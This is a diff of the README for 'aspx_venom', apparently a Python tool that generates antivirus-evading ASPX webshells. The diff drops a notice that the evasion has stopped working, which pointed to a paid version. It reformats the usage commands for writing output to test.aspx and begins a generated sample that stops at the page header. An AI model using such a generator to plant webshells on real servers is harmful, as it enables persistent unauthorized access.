@@ -1,17 +1,11 @@
-
-# 2019.8.14 已知免杀已失效，获取星球内部版请戳
-
-https://yzddmr6.tk/posts/webshell-venom-notice/
-
 ## 使用方法
 
-`python3 aspx_venom.py`
+```
+python3 aspx-venom.py       //生成
 
-保存:
-
-`python3 aspx_venom.py >  test.aspx`
-
-生成样例:
+python3 aspx-venom.py >  test.aspx   //保存
+```
+## 生成样例
 ```
 <%@ Page Language="Jscript" Debug=true%>
 <%
